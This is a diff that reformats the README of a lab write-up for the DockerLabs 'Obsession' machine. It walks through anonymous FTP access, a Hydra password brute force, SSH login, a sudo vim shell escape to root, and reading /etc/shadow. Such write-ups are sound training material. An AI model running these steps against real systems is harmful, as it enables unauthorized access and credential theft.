@@ -1,56 +1,87 @@
-# Obsession – Attack Path Analysis: FTP, SSH and Privilege Escalation
+<h1 align="center">🎯 Obsession — Attack Path Analysis</h1>
+<p align="center">
+  <img src="https://img.shields.io/badge/Platform-DockerLabs-blue?style=flat-square" />
+  <img src="https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=flat-square" />
+  <img src="https://img.shields.io/badge/Status-Completed-success?style=flat-square" />
+  <img src="https://img.shields.io/badge/OS-Linux-informational?style=flat-square" />
+</p>
 
-**Researcher:** Ackerman  
-**Platform:** DockerLabs  
-**Difficulty:** Easy  
-**Target IP:** 172.17.0.2  
-
----
-
-## Description
-
-Laboratorio enfocado en enumeración de servicios, acceso inicial mediante fuerza bruta y escalada de privilegios a través de una mala configuración en sudo.
-
----
-
-# Attack Tools
-
-- **Nmap**
-- **Gobuster**
-- **Hydra**
-- **FTP Client**
-- **OpenSSH**
-- **ExifTool**
-- **Vim**
-- **SecLists**
+<p align="center">
+  <b>Researcher:</b> Ackerman &nbsp;|&nbsp; <b>Target IP:</b> 172.17.0.2
+</p>
 
 ---
 
-## Reconnaissance
+## 📖 Table of Contents
 
-Initial port scan:
+- [Description](#-description)
+- [Attack Tools](#-attack-tools)
+- [Reconnaissance](#-reconnaissance)
+- [FTP Enumeration](#-ftp-enumeration)
+- [Web Enumeration](#-web-enumeration)
+- [Credential Bruteforce](#-credential-bruteforce)
+- [File Analysis](#-file-analysis)
+- [Initial Access](#-initial-access)
+- [Local Enumeration](#-local-enumeration)
+- [Privilege Escalation](#-privilege-escalation)
+- [Post Exploitation](#-post-exploitation)
+- [Loot](#-loot)
+- [Attack Chain](#-attack-chain)
+
+---
+
+## 📝 Description
+
+A machine focused on **service enumeration**, **initial access via brute force**, and **privilege escalation** through a sudo misconfiguration. The path chains together anonymous FTP disclosure, web content discovery, credential bruteforcing, and a classic GTFOBins-style privilege escalation via `vim`.
+
+---
+
+## 🛠 Attack Tools
+
+| Tool | Purpose |
+|---|---|
+| **Nmap** | Port & service scanning |
+| **Gobuster** | Web directory enumeration |
+| **Hydra** | Credential bruteforcing |
+| **FTP Client** | File transfer / enumeration |
+| **OpenSSH** | Remote access |
+| **ExifTool** | Metadata / steganography analysis |
+| **Vim** | Privilege escalation vector |
+| **SecLists** | Wordlists |
+
+---
+
+## 🔍 Reconnaissance
+
+Initial full port scan:
 
 ```bash
 nmap -sV -sC -p- 172.17.0.2
 ```
 
-Open services:
+<!-- ![Nmap scan results](screenshots/01-nmap-scan.png) -->
 
-- **21/tcp** → FTP (vsftpd 3.0.5)
-- **22/tcp** → SSH (OpenSSH 9.6p1)
-- **80/tcp** → HTTP (Apache 2.4.58)
+**Open services:**
 
-Anonymous FTP access was enabled.
+| Port | Service | Version |
+|---|---|---|
+| 21/tcp | FTP | vsftpd 3.0.5 |
+| 22/tcp | SSH | OpenSSH 9.6p1 |
+| 80/tcp | HTTP | Apache 2.4.58 |
+
+> ⚠️ Anonymous FTP access was enabled — first point of entry.
 
 ---
 
-## FTP Enumeration
+## 📂 FTP Enumeration
 
-Anonymous FTP login:
+Anonymous login:
 
 ```bash
 ftp 172.17.0.2
 ```
+
+<!-- ![Anonymous FTP login](screenshots/02-ftp-anon-login.png) -->
 
 Listing files:
 
@@ -58,49 +89,52 @@ Listing files:
 ls
 ```
 
-Files found:
+**Files found:**
+- `chat-gonza.txt`
+- `pendientes.txt`
 
-- **chat-gonza.txt**
-- **pendientes.txt**
-
-Downloading files:
+Downloading:
 
 ```bash
 get chat-gonza.txt
 get pendientes.txt
 ```
 
-Important findings:
+<!-- ![FTP files downloaded](screenshots/03-ftp-files.png) -->
 
-- Username identified: **russoski**
-- Internal notes about insecure permissions
+**Key findings:**
+- Username identified: **`russoski`**
+- Internal notes referencing insecure permissions
 
 ---
 
-## Web Enumeration
+## 🌐 Web Enumeration
 
-Directory enumeration with Gobuster:
+Directory brute-forcing:
 
 ```bash
 gobuster dir -u http://172.17.0.2 -w /opt/SecLists/Discovery/Web-Content/common.txt
 ```
 
-Interesting paths found:
+<!-- ![Gobuster results](screenshots/04-gobuster.png) -->
 
-- **/backup**
-- **/important**
+**Interesting paths found:**
+- `/backup`
+- `/important`
 
 ---
 
-## Credential Bruteforce
+## 🔑 Credential Bruteforce
 
-Bruteforce attack against FTP:
+Bruteforce against FTP using the identified username:
 
 ```bash
 hydra -l russoski -P /opt/SecLists/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt ftp://172.17.0.2
 ```
 
-Credentials found:
+<!-- ![Hydra bruteforce success](screenshots/05-hydra.png) -->
+
+**Credentials found:**
 
 ```text
 russoski:iloveme
@@ -108,25 +142,25 @@ russoski:iloveme
 
 ---
 
-## File Analysis
+## 📑 File Analysis
 
-Authenticated FTP access allowed more file discovery:
+Authenticated FTP session reveals more directories:
 
 ```bash
 cd Documentos
 ls
-
 cd ../Proyectos
 ls
 ```
 
-Files found:
+<!-- ![Authenticated FTP file listing](screenshots/06-ftp-authenticated.png) -->
 
-- **Nikola Tesla.jpg**
-- **README.md**
-- **Strong-Credentials.py**
+**Files found:**
+- `Nikola Tesla.jpg`
+- `README.md`
+- `Strong-Credentials.py`
 
-Downloaded:
+Download:
 
 ```bash
 get "Nikola Tesla.jpg"
@@ -143,27 +177,27 @@ cat README.md
 cat Strong-Credentials.py
 ```
 
+<!-- ![Exiftool metadata analysis](screenshots/07-exiftool.png) -->
+
 ---
 
-## Initial Access
+## 🚪 Initial Access
 
-SSH login with discovered credentials:
+SSH login with the credentials obtained:
 
 ```bash
 ssh russoski@172.17.0.2
 ```
 
-Successful login as:
+<!-- ![SSH login success](screenshots/08-ssh-login.png) -->
 
-```text
-russoski
-```
+Successful authentication as **`russoski`**.
 
 ---
 
-## Local Enumeration
+## 🖥 Local Enumeration
 
-Basic local checks:
+Basic post-access checks:
 
 ```bash
 whoami
@@ -172,7 +206,9 @@ hostname
 sudo -l
 ```
 
-Sudo misconfiguration found:
+<!-- ![Sudo permissions check](screenshots/09-sudo-l.png) -->
+
+**Sudo misconfiguration found:**
 
 ```text
 (root) NOPASSWD: /usr/bin/vim
@@ -180,13 +216,15 @@ Sudo misconfiguration found:
 
 ---
 
-## Privilege Escalation
+## ⬆️ Privilege Escalation
 
-Escalation using Vim:
+Escalating privileges by spawning a shell from `vim`:
 
 ```bash
 sudo vim -c ':!/bin/bash'
 ```
+
+<!-- ![Privilege escalation via vim](screenshots/10-privesc-vim.png) -->
 
 Verification:
 
@@ -195,7 +233,7 @@ whoami
 id
 ```
 
-Root access confirmed:
+**Root access confirmed:**
 
 ```text
 root
@@ -204,7 +242,7 @@ uid=0(root) gid=0(root)
 
 ---
 
-## Post Exploitation
+## 🔎 Post Exploitation
 
 Searching for sensitive files:
 
@@ -215,14 +253,15 @@ cat /root/*
 cat /etc/shadow
 ```
 
-Important findings:
+<!-- ![Root filesystem enumeration](screenshots/11-post-exploitation.png) -->
 
-- **Video-Nagore-Fernandez.txt**
-- **.root-passwd.txt**
-- **backup.txt**
-- **/etc/shadow**
+**Findings:**
+- `Video-Nagore-Fernandez.txt`
+- `.root-passwd.txt`
+- `backup.txt`
+- `/etc/shadow`
 
-Hidden URL found:
+Hidden URL discovered:
 
 ```text
 https://www.youtube.com/shorts/_v8GzGReTAk
@@ -230,22 +269,26 @@ https://www.youtube.com/shorts/_v8GzGReTAk
 
 ---
 
-## Loot
+## 💰 Loot
 
-Collected files:
+All collected artifacts are stored in [`loot/`](loot/):
 
-- **chat-gonza.txt**
-- **pendientes.txt**
-- **Nikola Tesla.jpg**
-- **README.md**
-- **Strong-Credentials.py**
-- **Video-Nagore-Fernandez.txt**
-- **/etc/shadow**
+- `chat-gonza.txt`
+- `pendientes.txt`
+- `Nikola Tesla.jpg`
+- `README.md`
+- `Strong-Credentials.py`
+- `Video-Nagore-Fernandez.txt`
+- `/etc/shadow`
 
 ---
 
-## Attack Chain
+## 🔗 Attack Chain
 
 ```text
 Recon → FTP Enum → Information Disclosure → Gobuster → Hydra → SSH → Sudo Abuse → Root
 ```
+
+---
+
+<p align="center"><i>Written for educational purposes as part of DockerLabs practice.</i></p>
